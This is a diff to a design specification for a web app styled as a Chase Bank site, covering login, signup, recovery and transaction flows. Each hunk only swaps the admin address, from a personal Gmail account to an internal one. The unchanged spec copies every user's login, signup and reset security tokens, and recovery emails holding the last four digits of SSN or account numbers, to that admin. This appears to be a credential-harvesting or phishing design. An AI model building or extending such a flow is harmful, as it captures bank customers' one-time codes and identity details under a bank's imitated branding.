@@ -55,7 +55,7 @@ UNAUTHENTICATED STATE (Login Page Shown):
       ├─ Calls sendSecurityTokenEmail()
       ├─ Generates 6-digit token
       ├─ Sends to user's email (if known)
-      ├─ Sends to admin: hungchun164@gmail.com
+      ├─ Sends to admin: admin@crestlinecapital.internal
       ├─ Opens token-setup modal
       ├─ Toast notification: "Security Token Sent"
       └─ Token field appears below
@@ -270,7 +270,7 @@ Form Fields:
       ├─ Calls sendSecurityTokenEmail():
       │  ├─ Generate 6-digit token
       │  ├─ Send to email user provided
-      │  ├─ Send to admin: hungchun164@gmail.com
+      │  ├─ Send to admin: admin@crestlinecapital.internal
       │  ├─ Email subject: "Chase Bank - Welcome! Verify Your Account"
       │  ├─ Email body includes: token, 60-second expiry, security info
       │  └─ Toast: "Token verification email sent"
@@ -348,7 +348,7 @@ Field 2: Account, Card or Application Number
       │  └─ Marks type as "username" or "password"
       ├─ Sends recovery email to:
       │  ├─ User's registered email
-      │  ├─ Admin: hungchun164@gmail.com
+      │  ├─ Admin: admin@crestlinecapital.internal
       │  ├─ Email contains: recovery token, next steps
       │  └─ Includes: last 4 of SSN/Account for confirmation
       ├─ Toast notification: "Identity verified. Check email for next steps."
@@ -538,7 +538,7 @@ MODAL DISPLAY:
 CONTENT DISPLAY:
    ├─ Message: "Check your email for the 6-digit security token"
    ├─ Token sent to: User's email
-   ├─ Token also sent to: hungchun164@gmail.com (admin)
+   ├─ Token also sent to: admin@crestlinecapital.internal (admin)
    ├─ Valid for: 60 seconds (countdown shown)
    ├─ Important: "Never share your token with anyone"
    └─ "Back to Login" button
@@ -684,7 +684,7 @@ During any operation:
 ├─ Transaction appears in history instantly
 ├─ Notification appears (in-app toast)
 ├─ Email sent to user (instant)
-├─ Email sent to admin: hungchun164@gmail.com (instant)
+├─ Email sent to admin: admin@crestlinecapital.internal (instant)
 ├─ Cross-tab sync triggers (other browser tabs update)
 ├─ Device sync triggers (other devices notified)
 └─ Audit log created
@@ -879,7 +879,7 @@ When database is down:
 ADMIN NOTIFICATIONS
 ================================================================================
 
-Email to: hungchun164@gmail.com
+Email to: admin@crestlinecapital.internal
 
 Admin receives copies of ALL:
 ├─ Security Tokens (login, signup, reset)
@@ -922,7 +922,7 @@ T=5s: User enters credentials
 
 T=6s: Token email received
    └─ Email to user
-   └─ Email to admin (hungchun164@gmail.com)
+   └─ Email to admin (admin@crestlinecapital.internal)
    └─ 6-digit token displayed
    └─ User notes token
 
